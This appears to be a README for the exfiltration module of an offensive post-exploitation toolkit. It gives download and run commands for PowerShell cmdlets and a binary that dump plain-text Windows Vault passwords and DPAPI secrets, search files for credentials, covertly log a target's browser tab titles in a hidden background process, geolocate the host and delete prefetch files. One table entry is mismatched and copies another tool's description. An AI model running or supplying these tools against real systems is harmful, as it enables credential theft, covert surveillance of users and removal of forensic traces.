## DLLSearch.ps1

|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|DLLSearch|List DLLs loaded by running processes!|User Land|\*\*\*|

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/DLLSearch.ps1" -OutFile "DLLSearch.ps1"
```

**execute:**
```powershell
.\DLLSearch.ps1 -Verb true
.\DLLSearch.ps1 -Verb true -Exclude 'lsass'
.\DLLSearch.ps1 -Verb true -Filter 'explorer'
.\DLLSearch.ps1 -Verb true -MaxProcesses '10'
```

<br />

## DecodeRDPCache.ps1

|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|DecodeRDPCache|reads RDP persistent cache from the cache0001.bin<br />file and stores cached bitmaps as PNG files|User Land|prerequisites: **cache0001.bin**|

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/DecodeRDPCache.ps1" -OutFile "DecodeRDPCache.ps1"
```

**execute:**
```powershell
.\DecodeRDPCache.ps1
```

<br />

## Find-AppLockerLogs.ps1

|Function Name|Description|Privileges|Notes|
|---|---|---|---|
|Find-AppLockerLogs|Look through the AppLocker logs to find processes that get run on the server|User Land|\*\*\*|

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Find-AppLockerLogs.ps1" -OutFile "Find-AppLockerLogs.ps1"
```

**execute:**
```powershell
Import-Module -Name .\Find-AppLockerLogs.ps1 -Force
Find-AppLockerLogs
```

<br />

## List-AllMailboxAndPST.ps1

|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|List-AllMailboxAndPST|Look through the AppLocker logs to find processes that get run on the server|User Land|\*\*\*|

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/List-AllMailboxAndPST.ps1" -OutFile "List-AllMailboxAndPST.ps1"
```

**execute:**
```powershell
.\List-AllMailboxAndPST.ps1
```

<br />

## WindowsUpdateLog.ps1

|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|[WindowsUpdateLog](https://github.com/r00t-3xp10it/redpill/blob/main/bin/WindowsUpdateLog.ps1)|Convert ETL logfiles (WindowsUpdate) into readable data|User Land|\*\*\*|

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/WindowsUpdateLog.ps1" -OutFile "WindowsUpdateLog.ps1"
```

**execute:**
```powershell
Get-Help .\WindowsUpdateLog.ps1 -Full

#Enumerate the first 100 windows update logs
.\WindowsUpdateLog.ps1

#Enumerate the first 8 windows update logs
.\WindowsUpdateLog.ps1 -First '8'

#Enumerate the first 100 windows update logs with '(Defender|FAILED|UDP)' strings
.\WindowsUpdateLog.ps1 -Filter '(Defender|FAILED|UDP)'

#Enumerate the first 100 windows update logs from the sellected directory
.\WindowsUpdateLog.ps1 -ETLPath "$Env:SYSTEMDRIVE\ProgramData\USOShared\Logs\System"

#Enumerate the first 30 windows update logs and create logfile
.\WindowsUpdateLog.ps1 -first '30' -logfile 'true'

```

<br />

## Get-PrefetchListing.ps1

|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|[Get-PrefetchListing](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Exfiltration/Get-PrefetchListing.ps1)|Manage (query \ Delete) prefetch files (.pf)|User Land|[Screenshot1](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Get-PrefetchListing.png)<br />[Screenshot2](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Get-PrefetchListing_Del.png)|

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Get-PrefetchListing.ps1" -OutFile "Get-PrefetchListing.ps1"
```

**execute:**
```powershell
#Enumerate all prefetch (.pf) files
.\Get-PrefetchListing.ps1 -action "Enum"

#Enumerate all prefetch (.pf) files of selected directory
.\Get-PrefetchListing.ps1 -action "Enum" -prefetch "$Env:WINDIR\Prefetch"

#Delete all prefetch (.pf) files
.\Get-PrefetchListing.ps1 -action "del"
```

<br />

**Final Notes:**
```
Get-PrefetchListing cmdlet does not recursive search or display 'folder names'
that have been found inside prefetch directory. It only manage (.pf) artifacts. 
```



<br />

## Get-ComputerGeolocation.ps1

|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|[Get-ComputerGeolocation](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Exfiltration/Get-ComputerGeoLocation.ps1)|Get the Computer's geographical location|User Land \ Administrator|[Screenshot1](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/GeoLocation_default.png)<br />[Screenshot2](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/GeoLocation_Force.png)<br />[Screenshot3](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/GeoLocation_Curl.png)<br />[Screenshot4](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/table.png)<br />[Screenshot5](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/list.png)|

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Get-ComputerGeoLocation.ps1" -OutFile "Get-ComputerGeolocation.ps1"
```

**execute:**
```powershell
#Get the Computer's geographical location
#Invoking 'GeoCoordinateWatcher' Or 'Curl' API's
.\Get-ComputerGeolocation.ps1

#Get the Computer's geographical location (API:curl\ipapi.co)
.\Get-ComputerGeolocation.ps1 -api "curl"

#Get the Computer's geographical location (API:curl\ipapi.co + hidde public addr)
.\Get-ComputerGeolocation.ps1 -api "curl" -publicaddr "false"

#Get the Computer's geographical location (API:ifconfig.me)
.\Get-ComputerGeolocation.ps1 -api "ifconfig"

#Get the Computer's geographical location (API: ifconfig.me) verbose outputs
.\Get-ComputerGeolocation.ps1 -Api 'ifconfig' -Detail 'true'

#Get the Computer's geographical location (API: GeoCoordinateWatcher) verbose outputs
.\Get-ComputerGeolocation.ps1 -Api 'GeoCoordinateWatcher' -Detail 'true'
```

<br />

**Final Notes:**
```powershell
[DESCRIPTION]
   Retrieves the Computer Geolocation using 'GeoCoordinateWatcher' Or
   'curl\ipapi.co' API (aprox location) if the 'GeoCoordinateWatcher'
   API fails to retrieve the coordinates from host device. (default)

[NOTES]
   GeoCoordinateWatcher API does not require administrator privileges
   to resolve address. But its required if cmdlet needs to create the
   comrrespondent registry hive\keys that 'allow' GeoLocation on host.

   Alternatively -api 'curl' Or -api 'ifconfig' API's can be invoked
   to resolve address location without the need of admin privileges.
   
   Remark: Parameter -detail 'true' (verbose outputs) its available
   by invoking 'GeoCoordinateWatcher' Or 'ifconfig' API's functions.   
```

<br />

## eviltree_x64.exe

|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|eviltree_x64|Search credentials in files|UserLand|[eviltree_x64](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/eviltree1.png)<br />[eviltree_x64](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/eviltree2.png)<br />[eviltree_x64](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/eviltree3.png)|

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/eviltree_x64.exe" -OutFile "eviltree_x64.exe"
```

**Create creds.txt on %TMP% for tests**
```
username=pedroUbuntu
password=r00t3xp10it
```

**execute:**
```powershell
# binary help
.\eviltree_x64.exe -h

# Search for 'password,username,login,token' strings
.\eviltree_x64.exe -r "$Env:TMP" -k "password,username,login,token" -v -q

# Search for 'passw,passwo,passwor,password' regex syntax
.\eviltree_x64.exe -r "$Env:TMP" -x ".{0,3}passw.{0,3}[=]{1}.{0,18}" -v -q

# Search for 'user,usern,userna,usernam,username,passw,passwo,passwor,password' regex
.\eviltree_x64.exe -r "$Env:TMP" -x "(.{0,3}user.{0,4}[=]{1}.{0,18}|.{0,3}passw.{0,3}[=]{1}.{0,18})" -v -q
```

<br />

## Invoke-VaultCmd.ps1

|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|[Invoke-VaultCmd](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Exfiltration/Invoke-VaultCmd.ps1)|Manage Windows Password Vault Items|UserLand|[screenshot1](https://user-images.githubusercontent.com/23490060/211175252-6bc1556b-2168-477c-afaf-df6d394478ad.png)<br />[screenshot2](https://user-images.githubusercontent.com/23490060/211175355-3d284911-1948-4ee3-a8dc-3a19742fa878.png)<br />[screenshot3](https://user-images.githubusercontent.com/23490060/211176317-6e394401-1ea4-4f84-bc23-790448660d14.png)|

|Parameter|Description|value|Default value|
|---|---|---|---|
|Action|\*\*\*|Check, Create, Dump, DPAPI, Delete|help|
|Resource or Url|URL or windows credential|user input|https://www.siliconvalley/classified.portal|
|UserName|credential username|User input|DOMAIN\USERNAME|
|Password|credential password|user input|r00t3xp10it|
|Help|cmdlet description help|Parameter Switch|Parameter Switch|
|Log|creates cmdlet logfiles|Parameter Switch|Parameter Switch|
|Secure|set password to PScredential<br />switch used in [create] and [dump]|Parameter Switch|Parameter Switch|

<br />

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Invoke-VaultCmd.ps1" -OutFile "Invoke-VaultCmd.ps1"
```

**execute:**
```powershell
#cmdlet help
Get-Help .\Invoke-VaultCmd.ps1 -full

#Check for stored Resource_names with creds
.\Invoke-VaultCmd.ps1 -action "check"

#Create new vault entry named 'MyCredential' with 'SKYNET\pedro' username and 'r00t3xp10it' as is access password
.\Invoke-VaultCmd.ps1 -action "create" -resource "MyCredential" -username "SKYNET\pedro" -password "r00t3xp10it"

#Dump ALL generic passwords [plain text] from vault
.\Invoke-VaultCmd.ps1 -action "dump"

#Dump DPAPI secrets (undecoded) to Invoke-VaultCmd.report
.\Invoke-VaultCmd.ps1 -action DPAPI -log

#Delete resource 'MyCredential' with 'BillGates' username and comrrespondent creds from vault
.\Invoke-VaultCmd.ps1 -action "delete" -resource "MyCredential" -username "SKYNET\pedro"
```

<br />

## BrowserLogger.ps1

|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|[browserLogger](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Exfiltration/browserLogger.ps1)|Spy target active tab browsing history (window title)|UserLand|[screenshot](https://user-images.githubusercontent.com/23490060/216802415-192429ed-66d3-479d-a9a9-1a2aa974a12c.png)|

|Parameter|Description|Default value|
|---|---|---|
|Delay|Delay time (seconds) between captures|3|
|Log|Switch that creates cmdlet results logfile|\*\*\*|
|Force|Bypass: <b><i>'none supported browsers found active'</b></i> internal tests|false|

<br />

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1" -OutFile "browserLogger.ps1"
```

**execute:**
```powershell
#cmdlet help
Get-Help .\browserLogger.ps1 -full

#Enumerate with 5 secs between captures
.\BrowserLogger.ps1 -delay '5'

#Store results on logfile ($pwd\Browser.report)
.\BrowserLogger.ps1 -log

[background execution]

#Execute cmdlet in background even if none browsers are found 'active' and store results on $pwd\Browser.report
PS C:\> Start-Process -WindowStyle hidden powershell -argumentlist "-file BrowserLogger.ps1 -force 'true' -log";exit

#Manual stop cmdlet process thats running in background
$PPID = (Get-Content -Path "$pwd\Browser.report"|Select-String -Pattern '\s*Process Id+\s*:+\s') -replace '\s*Process Id+\s*:+\s',''
Stop-Process -Id "$PPID" -Force

#Manual read logfile entrys
Get-Content -Path "$pwd\Browser.report"

#OR get only the windows title strings
Get-Content -Path "$pwd\Browser.report"|Select-String -Pattern 'Windows Title   :'
```
